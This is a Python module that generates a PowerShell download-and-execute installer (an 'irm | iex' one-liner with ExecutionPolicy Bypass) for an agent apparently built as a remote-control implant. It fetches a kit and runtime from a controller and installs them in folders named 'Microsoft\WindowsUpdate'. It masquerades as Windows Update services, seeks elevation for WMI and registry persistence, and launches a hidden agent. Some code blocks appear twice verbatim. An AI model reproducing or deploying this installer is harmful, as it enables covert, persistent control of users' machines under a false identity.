"""The one-liner served at ``/wu``.

Hard constraints, in priority order:

1. ``irm <base>/wu | iex`` MUST parse.  That means no top-level ``param()``:
   PowerShell requires param() to be the first statement of a script block, and
   iex compiles the string as one.  A bare assignment before param() throws
   "the param statement must be the first statement in a script block".
   The body therefore lives in a function; the last line calls it.

2. Must survive: no Python, no admin, UAC declined, PowerShell 5.1 only,
   Restricted ExecutionPolicy, a proxy, TLS interception, 32-bit Windows,
   ARM64 Windows, no %LOCALAPPDATA% (SYSTEM context), and a re-run over a
   running agent.

3. The elevated re-invocation must keep the ORIGINAL user's target path.
   Start-Process -Verb RunAs runs as the admin account, whose %LOCALAPPDATA%
   is a different profile.  The server bakes @@TARGET@@ from the query string
   instead of passing a parameter.
"""

from __future__ import annotations

import secrets
from .. import config, crypto  # noqa: F401, crypto  # noqa: F401

TEMPLATE = r'''
function Install-SysPy {

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$base    = '@@BASE@@'
$room    = '@@ROOM@@'
$pass    = '@@PASS@@'
$group   = '@@GROUP@@'
$salt    = '@@SALT@@'
$embed   = '@@EMBED@@'
$protect = @@PROTECT@@
$elevate = @@ELEVATE@@
$target  = '@@TARGET@@'
$pubkey  = '@@PUBKEY@@'
$fmt     = '@@FMT@@'
$proto   = '@@PROTO@@'
function Say([string]$m)  { Write-Host "  $m" }
function Warn([string]$m) { Write-Host "  [!] $m" }

try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Test-Admin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { $false }
}

function Fetch([string]$url, [string]$out) {
    for ($i = 1; $i -le 3; $i++) {
        try {
            try   { Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -TimeoutSec 180 }
            catch { (New-Object Net.WebClient).DownloadFile($url, $out) }
            if ((Test-Path $out) -and ((Get-Item $out).Length -gt 1024)) {
                try { Unblock-File $out } catch {}
                return $true
            }
        } catch { Start-Sleep -Seconds (2 * $i) }
    }
    $false
}

function Stop-OldAgent {
    try {
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match '^(python|pythonw|py|pyw)\.exe$' -and
            $_.CommandLine -like '*WindowsUpdate*' -and
            $_.CommandLine -notlike '*--purge*'
        } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    } catch {}
    Start-Sleep -Milliseconds 600
}

function Resolve-Target([string]$wanted) {
    if ($wanted -and $wanted.Trim()) { return $wanted.Trim() }
    $c = @()
    if ($env:LOCALAPPDATA) { $c += (Join-Path $env:LOCALAPPDATA 'Microsoft\WindowsUpdate') }
    if ($env:APPDATA)      { $c += (Join-Path $env:APPDATA      'Microsoft\WindowsUpdate') }
    if ($env:PROGRAMDATA)  { $c += (Join-Path $env:PROGRAMDATA  'Microsoft\WindowsUpdate') }
    if ($env:TEMP)         { $c += (Join-Path $env:TEMP         'Microsoft\WindowsUpdate') }
    foreach ($p in $c) {
        try {
            New-Item -ItemType Directory -Force -Path $p | Out-Null
            $probe = Join-Path $p '.wu-write-test'
            Set-Content -Path $probe -Value '1' -ErrorAction Stop
            Remove-Item $probe -Force -ErrorAction SilentlyContinue
            return $p
        } catch {}
    }
    throw 'no writable install directory'
}

# ---------------------------------------------------------------- arch
$arch = 'amd64'
try {
    if (-not [Environment]::Is64BitOperatingSystem) { $arch = 'win32' }
    elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { $arch = 'arm64' }
} catch {}

# ------------------------------------------------- resolve target, then elevate
if (-not $target) { $target = Resolve-Target '' }

if ($elevate -and -not (Test-Admin)) {
    $q = "irm '$base/wu?elevate=0&target=$([uri]::EscapeDataString($target))' | iex"
    try {
        Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -ArgumentList @(
            '-NoProfile','-ExecutionPolicy','Bypass','-Command', $q)
        if (Test-Path (Join-Path $target 'agent.py')) { Say 'installed (elevated)'; return }
        Warn 'elevated run finished but no agent.py - continuing user-level'
    } catch {
        Warn 'UAC declined - installing USER-LEVEL: no WMI consumer, no HKLM key'
        Warn 'run again from an Administrator PowerShell for full protection'
    }
}

New-Item -ItemType Directory -Force -Path $target | Out-Null
Say "target: $target"
$script:LOG = Join-Path $target 'install.log'
Add-Content -Path $script:LOG -Value "start $(Get-Date -Format o) admin=$((Test-Admin)) base=$base"
Stop-OldAgent

# ---------------------------------------------------------------- stage
Add-Type -AssemblyName System.IO.Compression.FileSystem
$kit   = Join-Path $env:TEMP 'wu-kit.zip'
$stage = Join-Path $env:TEMP ('wu-stage-' + [guid]::NewGuid().ToString('N').Substring(0,8))

if (-not (Fetch "$base/wu/kit.zip" $kit)) { throw "cannot download $base/wu/kit.zip" }

# ---- integrity. PowerShell 5.1 has no Ed25519, so verify the HMAC the
# controller publishes alongside. Catches a LAN MITM and a truncated file; the
# pinned Ed25519 key is enforced by the Python side on every later update.
try {
    $meta = (New-Object Net.WebClient).DownloadString("$base/wu/kit.meta") | ConvertFrom-Json
    $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
        [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$room|$pass"))
    $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
    $hex  = ([BitConverter]::ToString($hmac.ComputeHash([IO.File]::ReadAllBytes($kit)))).Replace('-','').ToLower()
    if ($meta.hmac -and $hex -ne $meta.hmac.ToLower()) {
        throw "kit integrity check failed (expected $($meta.hmac.Substring(0,12))..., got $($hex.Substring(0,12))...)"
    }
    Say "kit verified ($($meta.bytes) bytes)"
} catch [System.Management.Automation.MethodInvocationException] {
    Warn "integrity check unavailable: $($_.Exception.Message)"
} catch {
    if ($_.Exception.Message -like '*integrity check failed*') { throw }
    Warn "integrity check skipped: $($_.Exception.Message)"
}

# ---- integrity. PowerShell 5.1 has no Ed25519, so verify the HMAC the
# controller publishes alongside. Catches a LAN MITM and a truncated file; the
# pinned Ed25519 key is enforced by the Python side on every later update.
try {
    $meta = (New-Object Net.WebClient).DownloadString("$base/wu/kit.meta") | ConvertFrom-Json
    $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
        [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$room|$pass"))
    $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
    $hex  = ([BitConverter]::ToString($hmac.ComputeHash([IO.File]::ReadAllBytes($kit)))).Replace('-','').ToLower()
    if ($meta.hmac -and $hex -ne $meta.hmac.ToLower()) {
        throw "kit integrity check failed (expected $($meta.hmac.Substring(0,12))..., got $($hex.Substring(0,12))...)"
    }
    Say "kit verified ($($meta.bytes) bytes)"
} catch [System.Management.Automation.MethodInvocationException] {
    Warn "integrity check unavailable: $($_.Exception.Message)"
} catch {
    if ($_.Exception.Message -like '*integrity check failed*') { throw }
    Warn "integrity check skipped: $($_.Exception.Message)"
}

Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path $stage | Out-Null
[IO.Compression.ZipFile]::ExtractToDirectory($kit, $stage)

foreach ($owned in 'syspy','install','agent.py','bootstrap.py') {
    $dst = Join-Path $target $owned
    for ($t = 1; $t -le 5; $t++) {
        try { if (Test-Path $dst) { Remove-Item $dst -Recurse -Force -ErrorAction Stop }; break }
        catch { Start-Sleep -Milliseconds 400 }
    }
    $src = Join-Path $stage $owned
    if (Test-Path $src) { Move-Item $src $dst -Force }
}
Copy-Item $kit (Join-Path $target 'kit.zip') -Force
Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:TEMP 'wu-kit.zip') -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:TEMP 'wu-kit.zip') -Force -ErrorAction SilentlyContinue

foreach ($pair in @(@('install\wu.cmd','WindowsUpdateService.cmd'),
                    @('install\wu.vbs','WindowsUpdateService.vbs'))) {
    $s = Join-Path $target $pair[0]
    if (Test-Path $s) { Copy-Item $s (Join-Path $target $pair[1]) -Force }
}

# ---------------------------------------------------------------- deploy.json
$deploy = [ordered]@{
    url          = $base
    room         = $room
    pass         = $pass
    salt         = $salt
    fmt          = $fmt
    proto        = $proto
    pubkey       = $pubkey
    fmt          = $fmt
    proto        = $proto
    pubkey       = $pubkey
    parent       = ''
    parent_ip    = ''
    hop          = 0
    group        = $group
    protected    = $protect
    installed_at = [int](New-TimeSpan -Start (Get-Date '1970-01-01') -End (Get-Date)).TotalSeconds
}
[IO.File]::WriteAllText((Join-Path $target 'deploy.json'),
    ($deploy | ConvertTo-Json), (New-Object Text.UTF8Encoding($false)))

# ---------------------------------------------------------------- interpreter
function Resolve-Python {
    $rt = Join-Path $target 'runtime'
    foreach ($n in 'pythonw.exe','python.exe') {
        $p = Join-Path $rt $n
        if (Test-Path $p) { return @{ Exe = $p; Pre = @() } }
    }
    foreach ($n in 'pythonw.exe','python.exe','py.exe') {
        $c = Get-Command $n -ErrorAction SilentlyContinue
        if (-not $c) { continue }
        $pre = @(); if ((Split-Path $c.Source -Leaf) -ieq 'py.exe') { $pre = @('-3') }
        try {
            $v = & $c.Source @pre -c "import sys;print(sys.version_info[0])" 2>$null
            if ("$v".Trim() -eq '3') { return @{ Exe = $c.Source; Pre = $pre } }
        } catch {}
    }
    $null
}

$py = Resolve-Python
if (-not $py) {
    Say "no Python found - fetching a private interpreter ($arch)"
    $rt  = Join-Path $target 'runtime'
    $tmp = Join-Path $env:TEMP 'wu-py.zip'
    $ok  = Fetch "$base/wu/py.zip?arch=$arch" $tmp
    if (-not $ok -and $arch -ne 'amd64') { $ok = Fetch "$base/wu/py.zip?arch=amd64" $tmp }
    if (-not $ok) {
        $ok = Fetch "https://www.python.org/ftp/python/$embed/python-$embed-embed-amd64.zip" $tmp
    }
    if (-not $ok) { throw 'cannot obtain an interpreter' }

    Remove-Item $rt -Recurse -Force -ErrorAction SilentlyContinue
    New-Item -ItemType Directory -Force -Path $rt | Out-Null
    [IO.Compression.ZipFile]::ExtractToDirectory($tmp, $rt)

    Get-ChildItem $rt -Filter '*._pth' | ForEach-Object {
        $lines = Get-Content $_.FullName
        $lines = $lines -replace '^\s*#import\s*site\s*$', 'import site'
        if ($lines -notcontains 'import site') { $lines += 'import site' }
        if ($lines -notcontains '..')          { $lines += '..' }
        Set-Content $_.FullName $lines -Encoding ASCII
    }
    foreach ($n in 'pythonw.exe','python.exe') {
        $p = Join-Path $rt $n
        if (Test-Path $p) { $py = @{ Exe = $p; Pre = @() }; break }
    }
}
if (-not $py) { throw 'no usable interpreter' }

# ---------------------------------------------------------------- launch
$exe  = $py.Exe
$leaf = Split-Path $exe -Leaf
if ($leaf -ieq 'python.exe') {
    $w = Join-Path (Split-Path $exe) 'pythonw.exe'
    if (Test-Path $w) { $exe = $w }
} elseif ($leaf -ieq 'py.exe') {
    $w = Join-Path (Split-Path $exe) 'pyw.exe'
    if (Test-Path $w) { $exe = $w }
}

$launchArgs = @() + $py.Pre + @((Join-Path $target 'agent.py'), '--hidden', '--no-elevate')
Start-Process -FilePath $exe -ArgumentList $launchArgs -WindowStyle Hidden
Say 'installed.'
Add-Content -Path (Join-Path $target 'install.log') -Value (
    "ok $(Get-Date -Format o) python=$exe target=$target elevated=$((Test-Admin))")
}

Install-SysPy
'''


def render(base: str = "", room: str = "", passphrase: str = "", group: str = "",
           salt: str = "", target: str = "", protect: bool = True,
           elevate: bool = True) -> str:
    """Return the installer script with the deployment baked in."""
    def esc(value: str) -> str:
        """Escape for a single-quoted PowerShell string.

        Only @@TARGET@@ used to be escaped; a passphrase containing an
        apostrophe broke the whole one-liner.
        """
        return str(value).replace("'", "''")

    return (TEMPLATE
            .replace("@@BASE@@", esc((base or config.PUBLIC_URL).rstrip("/")))
            .replace("@@ROOM@@", esc(room or config.ROOM))
            .replace("@@PASS@@", esc(passphrase or config.PASSPHRASE))
            .replace("@@GROUP@@", esc(group))
            .replace("@@SALT@@", esc(salt or secrets.token_hex(4)))
            .replace("@@TARGET@@", esc(target))
            .replace("@@PUBKEY@@", esc(config.PUBKEY_HEX))
            .replace("@@FMT@@", str(config.ENVELOPE_FMT))
            .replace("@@PROTO@@", str(config.PROTOCOL_VERSION))
            .replace("@@EMBED@@", getattr(config, "EMBED_VERSION", "3.12.8"))
            .replace("@@PROTECT@@", "$true" if protect else "$false")
            .replace("@@ELEVATE@@", "$true" if elevate else "$false"))


def one_liner(base: str) -> str:
    suffix = f"?k={config.WU_TOKEN}" if config.WU_TOKEN else ""
    return ('powershell -NoProfile -ExecutionPolicy Bypass '
            f'-Command "irm {base.rstrip("/")}/wu{suffix} | iex"')


def one_liner_legacy(base: str) -> str:
    return ('powershell -NoProfile -ExecutionPolicy Bypass -Command '
            f'"(New-Object Net.WebClient).DownloadString(\'{base.rstrip("/")}/wu\') | iex"')
